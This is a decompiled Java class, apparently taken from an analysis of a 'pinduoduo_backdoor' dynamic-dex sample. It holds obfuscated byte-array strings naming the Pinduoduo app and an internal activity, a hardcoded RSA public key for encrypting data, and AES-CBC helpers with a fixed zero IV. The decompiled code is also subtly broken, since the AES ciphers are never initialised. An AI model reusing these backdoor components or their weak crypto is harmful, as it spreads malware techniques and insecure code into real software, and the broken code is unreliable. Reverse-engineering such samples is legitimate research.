package com.google.android.sd.biz_dynamic_dex.base;

import android.util.Base64;
import java.security.KeyFactory;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.X509EncodedKeySpec;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public final class b {
  private static final byte[] a = new byte[] { 
      67, 79, 77, 14, 88, 85, 78, 77, 69, 78, 
      71, 14, 80, 73, 78, 68, 85, 79, 68, 85, 
      79 };
  
  private static final byte[] b = new byte[] { 
      67, 79, 77, 14, 88, 85, 78, 77, 69, 78, 
      71, 14, 80, 73, 78, 68, 85, 79, 68, 85, 
      79, 14, 68, 90, 81, 67, 14, 65, 67, 84, 
      73, 86, 69, 14, 47, 84, 72, 69, 82, 33, 
      67, 84, 73, 86, 73, 84, 89 };
  
  public static String a() {
    StringBuilder stringBuilder = new StringBuilder();
    byte[] arrayOfByte = b;
    int j = arrayOfByte.length;
    for (int i = 0; i < j; i++)
      stringBuilder.append((char)(arrayOfByte[i] + 32)); 
    return stringBuilder.toString();
  }
  
  public static String a(byte[] paramArrayOfbyte) {
    try {
      paramArrayOfbyte = Base64.encodeToString(paramArrayOfbyte, 2).getBytes();
      byte[] arrayOfByte = Base64.decode("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCgXnv1pdUaxZb5YqbHZ1GYagbrOZH0PfemeSZfi4szU+IUMHpnJX4GKKbRRMLYHUoozvgFwi8/wiQUq1NTtNXs6tFe2RI6R7/szkCmWhV5e+XKZQnJ2YNxvZLxTF/UKuFnFZ+RHCT8yf1/LQj2mfUbTs9zxqlxWpqkr6mAPVuJYwIDAQAB", 2);
      RSAPublicKey rSAPublicKey = (RSAPublicKey)KeyFactory.getInstance("RSA").generatePublic(new X509EncodedKeySpec(arrayOfByte));
      Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
      cipher.init(1, rSAPublicKey);
      paramArrayOfbyte = cipher.doFinal(paramArrayOfbyte);
      if (paramArrayOfbyte != null)
        return Base64.encodeToString(paramArrayOfbyte, 2); 
    } finally {}
    return "";
  }
  
  public static String a(byte[] paramArrayOfbyte, String paramString) {
    try {
      IvParameterSpec ivParameterSpec = new IvParameterSpec(new byte[16]);
      SecretKeySpec secretKeySpec = new SecretKeySpec(paramArrayOfbyte, "AES");
      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
      return Base64.encodeToString(cipher.doFinal(paramString.getBytes()), 2);
    } finally {
      paramArrayOfbyte = null;
    } 
  }
  
  public static byte[] a(byte[] paramArrayOfbyte1, byte[] paramArrayOfbyte2) {
    try {
      IvParameterSpec ivParameterSpec = new IvParameterSpec(new byte[16]);
      SecretKeySpec secretKeySpec = new SecretKeySpec(paramArrayOfbyte1, "AES");
      Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
      return cipher.doFinal(paramArrayOfbyte2);
    } finally {
      paramArrayOfbyte1 = null;
    } 
  }
  
  public static byte[] b() {
    try {
      KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
      return keyGenerator.generateKey().getEncoded();
    } finally {
      Exception exception = null;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\183bb87aa7d744a195741ce524577dd0-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\base\b.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */